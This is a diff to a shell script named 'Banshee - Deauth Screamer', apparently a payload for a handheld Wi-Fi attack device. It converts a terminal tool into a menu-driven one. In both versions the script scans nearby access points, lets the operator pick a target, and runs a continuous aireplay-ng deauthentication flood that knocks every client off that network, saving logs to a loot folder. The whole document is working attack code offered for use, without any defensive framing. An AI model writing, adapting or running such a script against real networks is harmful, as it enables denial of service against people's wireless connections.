@@ -1,73 +1,97 @@
-#!/bin/sh
+#!/bin/bash
 # Title: Banshee - Deauth Screamer
 # Author: NullSec
-# Description: Aggressive deauthentication attack using aireplay-ng
-# Category: WiFi Attack
+# Description: Aggressive deauthentication attack
+# Category: nullsec/attack
 
 LOOT_DIR="/mmc/nullsec/banshee"
 mkdir -p "$LOOT_DIR"
 
-echo "👻 BANSHEE - DEAUTH SCREAMER"
-echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
+PROMPT "BANSHEE - DEAUTH SCREAMER
 
-[ ! -d "/sys/class/net/wlan0" ] && { echo "[!] wlan0 not found!"; exit 1; }
+Aggressive deauthentication
+attack on target networks.
 
-echo "[*] Enabling monitor mode..."
-airmon-ng start wlan0 >/dev/null 2>&1
-MON_IF=$(iw dev | grep -oE "wlan[0-9]mon" | head -1)
-[ -z "$MON_IF" ] && MON_IF="wlan0mon"
+Disconnects all clients
+from selected AP.
 
-echo "[*] Scanning for targets (15s)..."
+Press OK to configure."
+
+MON_IF=""
+for iface in wlan1mon wlan2mon wlan0mon; do
+    [ -d "/sys/class/net/$iface" ] && MON_IF="$iface" && break
+done
+[ -z "$MON_IF" ] && { ERROR_DIALOG "No monitor interface!
+
+Run: airmon-ng start wlan1"; exit 1; }
+
+SPINNER_START "Scanning for targets..."
+rm -f /tmp/banshee*
 timeout 15 airodump-ng "$MON_IF" -w /tmp/banshee --output-format csv 2>/dev/null &
 sleep 15
+killall airodump-ng 2>/dev/null
+SPINNER_STOP
 
+NET_COUNT=0
+NETS=""
 if [ -f /tmp/banshee-01.csv ]; then
-    echo ""
-    echo "Available targets:"
-    grep -E "^[0-9A-F]{2}:" /tmp/banshee-01.csv 2>/dev/null | \
-        awk -F',' '{print NR") BSSID:"$1" CH:"$4" ESSID:"$14}' | head -15
-    echo ""
-    echo -n "Select target number: "
-    read TARGET_NUM
-    
-    TARGET_LINE=$(grep -E "^[0-9A-F]{2}:" /tmp/banshee-01.csv | sed -n "${TARGET_NUM}p")
-    TARGET_BSSID=$(echo "$TARGET_LINE" | cut -d',' -f1 | tr -d ' ')
-    TARGET_CH=$(echo "$TARGET_LINE" | cut -d',' -f4 | tr -d ' ')
-else
-    echo -n "Enter target BSSID: "
-    read TARGET_BSSID
-    echo -n "Enter channel: "
-    read TARGET_CH
+    while IFS=',' read -r bssid x1 x2 channel x3 x4 x5 x6 power x7 x8 x9 x10 essid rest; do
+        bssid=$(echo "$bssid" | tr -d ' ')
+        [[ ! "$bssid" =~ ^[0-9A-Fa-f]{2}: ]] && continue
+        essid=$(echo "$essid" | sed 's/^[[:space:]]*//' | head -c 18)
+        [ -z "$essid" ] && essid="[Hidden]"
+        NET_COUNT=$((NET_COUNT + 1))
+        NETS="${NETS}${NET_COUNT}. ${essid}\n"
+        eval "BSSID_${NET_COUNT}=\"$bssid\""
+        eval "CH_${NET_COUNT}=$(echo $channel | tr -d ' ')"
+        eval "ESSID_${NET_COUNT}=\"$essid\""
+        [ $NET_COUNT -ge 10 ] && break
+    done < /tmp/banshee-01.csv
 fi
 
-echo -n "Duration in seconds [120]: "
-read DURATION
-DURATION=${DURATION:-120}
+[ $NET_COUNT -eq 0 ] && { ERROR_DIALOG "No networks found!"; exit 1; }
 
-echo ""
-echo "[*] Setting channel $TARGET_CH..."
-iwconfig "$MON_IF" channel "$TARGET_CH" 2>/dev/null
+PROMPT "TARGETS: $NET_COUNT
 
-echo "[*] Unleashing Banshee on $TARGET_BSSID..."
+$(echo -e "$NETS")
+Select target next."
+
+TARGET_NUM=$(NUMBER_PICKER "Target (1-$NET_COUNT):" 1)
+case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) exit 0 ;; esac
+
+eval "TARGET_BSSID=\"\$BSSID_${TARGET_NUM}\""
+eval "TARGET_CH=\"\$CH_${TARGET_NUM}\""
+eval "TARGET_ESSID=\"\$ESSID_${TARGET_NUM}\""
+
+DURATION=$(NUMBER_PICKER "Duration (seconds):" 60)
+case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=60 ;; esac
+
+resp=$(CONFIRMATION_DIALOG "UNLEASH BANSHEE?
+
+Target: $TARGET_ESSID
+BSSID: $TARGET_BSSID
+Channel: $TARGET_CH
+Duration: ${DURATION}s
+
+Press OK to attack.")
+[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0
+
+LOG "Banshee attacking $TARGET_ESSID..."
 LOG_FILE="$LOOT_DIR/banshee_$(date +%Y%m%d_%H%M).log"
 
-# Continuous deauth attack
-timeout $DURATION aireplay-ng -0 0 -a "$TARGET_BSSID" "$MON_IF" 2>&1 | tee "$LOG_FILE" &
-ATTACK_PID=$!
+iwconfig "$MON_IF" channel "$TARGET_CH" 2>/dev/null
+timeout "$DURATION" aireplay-ng -0 0 -a "$TARGET_BSSID" "$MON_IF" 2>&1 | tee "$LOG_FILE" &
+wait $!
+killall aireplay-ng 2>/dev/null
 
-echo "[+] Attack running (PID: $ATTACK_PID)"
-echo "[*] Duration: ${DURATION}s"
-echo "[*] Press Ctrl+C to stop early"
-wait $ATTACK_PID
-
-# Cleanup
-airmon-ng stop "$MON_IF" >/dev/null 2>&1
 rm -f /tmp/banshee* 2>/dev/null
 
-DEAUTH_COUNT=$(grep -c "Sending DeAuth" "$LOG_FILE" 2>/dev/null || echo "0")
-echo ""
-echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-echo "👻 BANSHEE COMPLETE"
-echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
-echo "Deauths sent: ~$DEAUTH_COUNT"
-echo "Log: $LOG_FILE"
+DEAUTH_COUNT=$(grep -c "Sending DeAuth" "$LOG_FILE" 2>/dev/null || echo "N/A")
+
+PROMPT "BANSHEE COMPLETE
+
+Target: $TARGET_ESSID
+Deauths sent: ~$DEAUTH_COUNT
+Log: $LOG_FILE
+
+Press OK to exit."
